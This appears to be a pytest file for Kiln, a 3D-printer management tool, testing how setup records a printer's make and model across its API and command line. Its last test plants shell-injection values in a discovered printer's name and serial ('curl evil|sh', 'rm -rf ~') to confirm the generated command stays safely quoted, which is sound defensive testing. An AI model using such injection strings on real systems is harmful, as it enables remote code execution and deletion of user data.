"""Every printer set up says which printer it is: make and model.

2026-10-27: a Prusa Core One L owner's install asked Kiln's servers about
its printer ~290 times a day, and Kiln had no record for it.  Setup had let
the model be skipped at some doors, refused a model it did not know at
others, and steered an unknown printer toward a near catalogue name.  One
rule (``kiln.printer_declaration``) now answers every door: a known model is
taken as written, an unknown one is recorded as ``<make>_<model>`` under the
generic limits, and nothing is guessed.  And a printer's NAME, which is what
the person called it, never stands in for its model in what Kiln reports.
"""

from __future__ import annotations

from unittest import mock

import pytest
from click.testing import CliRunner

from kiln.printer_declaration import (
    PrinterDeclarationError,
    declare_printer,
    printer_makers,
)


class TestTheRule:
    def test_a_known_model_is_taken_as_written(self):
        declared = declare_printer(None, "Neptune 4 Plus")
        assert declared.in_catalogue and declared.model_key == "Neptune 4 Plus"

    def test_a_known_model_named_with_its_maker_is_found(self):
        declared = declare_printer("Bambu Lab", "X1 Carbon")
        assert declared.in_catalogue and declared.make == "Bambu Lab"

    def test_an_unknown_model_is_recorded_with_its_maker(self):
        declared = declare_printer("Prusa", "Core One L")
        assert (declared.model_key, declared.in_catalogue) == ("prusa_core_one_l", False)
        assert "generic safe limits" in declared.note

    def test_the_maker_written_into_the_model_is_not_doubled(self):
        assert declare_printer("Prusa", "Prusa Core One").model_key == "prusa_core_one"

    def test_a_maker_kiln_does_not_list_is_still_accepted(self):
        assert declare_printer("Anycubic", "Kobra X").model_key == "anycubic_kobra_x"

    def test_an_unknown_model_with_no_maker_is_asked_about_never_guessed(self):
        with pytest.raises(PrinterDeclarationError) as raised:
            declare_printer(None, "Core One L")
        assert raised.value.code == "PRINTER_MAKE_REQUIRED"

    def test_a_connection_that_reaches_one_maker_names_it(self):
        assert declare_printer(None, "Core One L", printer_type="prusalink").model_key == "prusa_core_one_l"

    def test_a_bambu_connection_names_its_maker_too(self):
        assert declare_printer(None, "X1 Carbon", printer_type="bambu").in_catalogue
        declared = declare_printer(None, "H9", printer_type="bambu")
        assert (declared.model_key, declared.in_catalogue) == ("bambu_h9", False)

    def test_a_model_is_never_moved_to_another_makers_printer(self):
        declared = declare_printer("Prusa", "A1")
        assert not declared.in_catalogue and declared.model_key == "prusa_a1"

    def test_a_maker_alone_is_not_a_printer(self):
        with pytest.raises(PrinterDeclarationError) as raised:
            declare_printer("Bambu Lab", "Bambu")
        assert raised.value.code == "INVALID_PRINTER_MODEL"

    def test_no_model_is_refused(self):
        with pytest.raises(PrinterDeclarationError) as raised:
            declare_printer("Prusa", "  ")
        assert raised.value.code == "PRINTER_MODEL_REQUIRED"

    def test_the_makers_come_from_the_catalogue(self):
        from kiln.design_intelligence import _derive_manufacturer
        from kiln.printers.bed_fit import _load_printer_intelligence

        makers = printer_makers()
        rows = _load_printer_intelligence()
        for key, row in rows.items():
            if key.startswith("_") or key in ("default", "klipper_generic"):
                continue
            assert _derive_manufacturer(key, row.get("display_name", "")) in makers, key
        assert "Generic" not in makers


class TestTheAgentsDoor:
    def test_a_printer_with_no_model_is_not_registered(self, monkeypatch):
        import kiln.server as srv
        from kiln.registry import PrinterRegistry

        registry = PrinterRegistry()
        monkeypatch.setattr(srv, "_registry", registry)
        out = srv.register_printer(
            name="shelf", printer_type="moonraker", host="http://10.0.0.9", persist=False, verify_connection=False,
        )
        assert out["success"] is False and out["error"]["code"] == "PRINTER_MODEL_REQUIRED"
        assert "shelf" not in registry

    def test_a_bambu_says_its_model_too(self, monkeypatch):
        # No connection is exempt: the person knows what they bought.
        import kiln.server as srv
        from kiln.registry import PrinterRegistry

        registry = PrinterRegistry()
        monkeypatch.setattr(srv, "_registry", registry)
        out = srv.register_printer(
            name="a1", printer_type="bambu", host="10.0.0.5", api_key="12345678",
            serial="03900D5C0000000", persist=False, verify_connection=False,
        )
        assert out["success"] is False and out["error"]["code"] == "PRINTER_MODEL_REQUIRED"
        assert "a1" not in registry

    def test_an_unknown_printer_is_registered_as_named(self, monkeypatch):
        import kiln.server as srv
        from kiln.registry import PrinterRegistry

        registry = PrinterRegistry()
        monkeypatch.setattr(srv, "_registry", registry)
        out = srv.register_printer(
            name="shelf", printer_type="moonraker", host="http://10.0.0.9", persist=False,
            verify_connection=False, printer_model="Core One L", printer_make="Prusa",
        )
        assert out["success"] is True, out
        assert registry.get("shelf").declared_printer_model() == "prusa_core_one_l"


class TestTheCommandLine:
    def test_kiln_auth_refuses_a_printer_with_no_model(self):
        from kiln.cli.main import cli

        with mock.patch("kiln.cli.main.save_printer") as save:
            result = CliRunner().invoke(
                cli, ["auth", "--name", "p", "--host", "http://octopi.local", "--type", "octoprint", "--api-key", "k"],
            )
        assert result.exit_code == 2 and not save.called
        assert "--printer-model" in result.output

    def test_kiln_auth_records_an_unknown_printer_with_its_maker(self):
        from kiln.cli.main import cli
        from kiln.cli.config import PrinterSaveResult

        with mock.patch(
            "kiln.cli.main.save_printer", return_value=PrinterSaveResult(None, "p", "added"),
        ) as save:
            CliRunner().invoke(cli, [
                "auth", "--name", "p", "--host", "http://octopi.local", "--type", "octoprint", "--api-key", "k",
                "--printer-model", "Kobra X", "--printer-make", "Anycubic", "--json",
            ])
        assert save.call_args.kwargs["printer_model"] == "anycubic_kobra_x"


class TestTheNameIsNeverTheModel:
    def test_a_printer_with_no_model_reports_none_never_its_name(self):
        from kiln import community_autofire as ca

        with mock.patch(
            "kiln.community_autofire.geometric_signatures_for", return_value=("g" * 16, "v2:" + "g" * 13),
        ), mock.patch("kiln.community_autofire.resolve_adapter_model", return_value=None), mock.patch(
            "kiln.community_outbox.contribute_print_outcome", return_value={"queued": True},
        ) as contrib:
            ca.contribute_resolved_outcome(
                outcome="completed", printer_name="Sarah's garage printer", printer_file_name="plate.gcode",
            )
        assert contrib.call_args.kwargs["printer_model"] is None


class TestUpdatingASavedPrinter:
    def test_kiln_auth_updating_a_saved_printer_need_not_repeat_its_model(self, tmp_path, monkeypatch):
        import yaml

        from kiln.cli.config import PrinterSaveResult
        from kiln.cli.main import cli

        path = tmp_path / "config.yaml"
        path.write_text(yaml.safe_dump({"printers": {
            "shelf": {"type": "octoprint", "host": "http://octopi.local", "printer_model": "prusa_core_one_l"},
        }}), encoding="utf-8")
        monkeypatch.setattr("kiln.cli.config.get_config_path", lambda: path)
        with mock.patch(
            "kiln.cli.main.save_printer", return_value=PrinterSaveResult(path, "shelf", "updated"),
        ) as save:
            result = CliRunner().invoke(cli, [
                "auth", "--name", "shelf", "--host", "http://octopi.local", "--type", "octoprint",
                "--api-key", "new-key", "--json",
            ])
        # Not refused for leaving the model out: the save keeps the saved
        # model of the same machine (test_cli_main's "Kept printer_model").
        assert result.exit_code == 0, result.output
        assert save.call_args.kwargs["printer_model"] is None


class TestTheHandedOverCommand:
    def test_a_hostile_name_from_the_network_cannot_run_in_a_shell(self):
        # Quickstart hands over a command a person or an agent may paste into
        # a shell, and the name, address and serial are what a device on the
        # network advertised.
        import shlex

        from kiln.cli.discovery import DiscoveredPrinter
        from kiln.cli.main import cli

        found = DiscoveredPrinter(
            host="10.0.0.7", port=5000, printer_type="octoprint", name="x;curl evil|sh",
            serial="ABC123;rm -rf ~",
        )
        with (
            mock.patch("kiln.cli.main._list_printers", return_value=[]),
            mock.patch("kiln.cli.main.save_printer"),
            mock.patch("kiln.cli.main.load_printer_config", side_effect=ValueError("not ready")),
            mock.patch("kiln.cli.discovery.discover_printers", return_value=[found]),
        ):
            result = CliRunner().invoke(cli, ["quickstart", "--json"])
        import json

        finish = json.loads(result.output)["data"]["setup"]["finish_with"]
        # Tokenised the way a shell reads it: an unquoted ; or | would come
        # out as its own token and start a second command.
        lexer = shlex.shlex(finish.replace("<model>", "MODEL"), posix=True, punctuation_chars=";|&")
        words = list(lexer)
        assert not {";", "|", "&", "&&", "||"} & set(words), words
        assert words[:2] == ["kiln", "auth"]
        assert words[words.index("--name") + 1] == "x;curl-evil|sh"
        assert "--serial" not in words  # not a serial, so not handed over
